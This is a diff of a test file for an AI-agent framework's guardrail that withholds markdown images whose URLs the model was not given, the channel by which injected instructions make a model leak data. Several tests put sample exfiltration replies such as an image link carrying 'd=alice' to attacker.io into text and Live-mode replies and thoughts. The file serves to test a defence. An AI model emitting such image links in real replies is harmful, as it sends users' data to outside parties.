@@ -1,3 +1,4 @@
+import { runTurn } from '../fixtures/registered-runner.ts';
 /**
  * A reply image is a leak unless the model was given its URL this turn (or
  * Live session): by the system prompt, the user, a tool result or host
@@ -7,12 +8,7 @@ import '../fixtures/test-host.ts';
 import { z } from 'zod';
 import { lexiconDefault } from '../../src/guardrails/lexicon.ts';
 import { DETECT_RULES } from '../../src/guardrails/rules.ts';
-import {
-  registerProfile,
-  registerTool,
-  runSession,
-  runTurn,
-} from '../../src/kernel/default-scope.ts';
+import { registerProfile, registerTool, runSession } from '../../src/kernel/default-scope.ts';
 import { assertEquals } from '../../src/kernel/engine/assert.ts';
 import { defineProfile } from '../../src/kernel/registry/profiles.ts';
 import type { ModelProvider, TurnEvent, TurnRequest } from '../../src/kernel/types.ts';
@@ -21,9 +17,7 @@ import { MockLiveWebSocket } from '../fixtures/live-socket.ts';
 import { geminiModels, HOST_BINDINGS } from '../fixtures/models.ts';
 
 const OMIT_IMAGE = lexiconDefault('thought.omitted_image');
-
 const PHOTO = 'https://news.site/photo.jpg';
-
 registerTool({
   type: 'function',
   name: 'image_lookup',
@@ -37,7 +31,6 @@ registerTool({
   output: z.object({ url: z.string() }),
   handler: () => ({ url: PHOTO }),
 });
-
 registerProfile(
   defineProfile({
     type: 'text',
@@ -54,10 +47,12 @@ registerProfile(
     },
   }),
 );
-
 /** Step one looks up a photo, saying `first`; step two replies `reply`. */
 /** Whether the reply was stopped for an image, and whether a thought had one omitted. */
-function imageVerdicts(events: TurnEvent[]): { imageBlocked: boolean; thoughtOmitted: boolean } {
+function imageVerdicts(events: TurnEvent[]): {
+  imageBlocked: boolean;
+  thoughtOmitted: boolean;
+} {
   const image = eventsOf(events, 'guardrail').filter((e) =>
     e.guardrail.hits?.some((hit) => hit.rule === DETECT_RULES.ungiven_images),
   );
@@ -68,7 +63,6 @@ function imageVerdicts(events: TurnEvent[]): { imageBlocked: boolean; thoughtOmi
     ),
   };
 }
-
 function lookupThen(reply: string, first?: string): ModelProvider {
   let call = 0;
   return {
@@ -87,7 +81,6 @@ function lookupThen(reply: string, first?: string): ModelProvider {
     },
   };
 }
-
 async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) {
   const events: TurnEvent[] = [];
   for await (const event of runTurn(
@@ -106,13 +99,11 @@ async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) 
       .join(''),
   };
 }
-
 Deno.test('image exfil: an image a tool returned renders', async () => {
   const reply = `Here: ![photo](${PHOTO})`;
   const { text, imageBlocked } = await run(lookupThen(reply));
   assertEquals([imageBlocked, text.includes(reply)], [false, true]);
 });
-
 Deno.test('image exfil: images from the system prompt and the user render', async () => {
   const reply = '![logo](https://brand.site/logo.png) ![mine](https://user.site/cat.png)';
   const { imageBlocked } = await run(lookupThen(reply), {
@@ -120,18 +111,15 @@ Deno.test('image exfil: images from the system prompt and the user render', asyn
   });
   assertEquals(imageBlocked, false);
 });
-
 Deno.test('image exfil: an image carrying data to a URL nobody gave the model is withheld', async () => {
   const { text, imageBlocked } = await run(lookupThen('![p](https://attacker.io/p?d=alice)'));
   assertEquals([imageBlocked, /attacker\.io/.test(text)], [true, false]);
 });
-
 Deno.test('image exfil: a URL the model wrote itself earlier in the turn is not given to it', async () => {
   const url = 'https://attacker.io/p?d=alice';
   const { text, imageBlocked } = await run(lookupThen(`![p](${url})`, `Looking up ${url} `));
   assertEquals([imageBlocked, text.includes('![p]')], [true, false]);
 });
-
 Deno.test('image exfil: a thought loading an unseen image loses it, and the turn goes on', async () => {
   const provider: ModelProvider = {
     async *complete() {
@@ -153,16 +141,20 @@ Deno.test('image exfil: a thought loading an unseen image loses it, and the turn
   );
   assertEquals(thought.includes('![photo](https://brand.site/logo.png)'), true);
 });
-
 async function liveReply(
   reply: string,
   thought?: string,
-): Promise<{ text: string; thought: string; imageBlocked: boolean; thoughtOmitted: boolean }> {
+): Promise<{
+  text: string;
+  thought: string;
+  imageBlocked: boolean;
+  thoughtOmitted: boolean;
+}> {
   const profile = defineProfile({
     type: 'live',
     id: 'image_exfil_live',
     identity: { handle: 'live', system: 'hi' },
-    models: { gemini31FlashLive: { ...HOST_BINDINGS.gemini31FlashLive, key: 'slotA' } },
+    models: { gemini31FlashLive: { ...HOST_BINDINGS.gemini31FlashLive, keySlot: 'slotA' } },
     live: { voice: 'Aoede', ingress: { text: true } },
     tools: { allow: ['image_lookup'] },
     guardrails: { blockedReply: { onBlock: 'refuse' } },
@@ -213,14 +205,12 @@ async function liveReply(
     ...imageVerdicts(events),
   };
 }
-
 Deno.test('image exfil: a Live reply and its transcript render an image a tool returned, and withhold one nobody gave', async () => {
   const shown = await liveReply(`![photo](${PHOTO})`);
   assertEquals([shown.imageBlocked, shown.text.includes(PHOTO)], [false, true]);
   const leaked = await liveReply('![p](https://attacker.io/p?d=alice)');
   assertEquals([leaked.imageBlocked, /attacker\.io/.test(leaked.text)], [true, false]);
 });
-
 Deno.test('image exfil: a Live thought loading an unseen image loses it, and the reply goes on', async () => {
   const shown = await liveReply('All set.', 'Try ![p](https://attacker.io/p?d=alice) first. ');
   assertEquals(
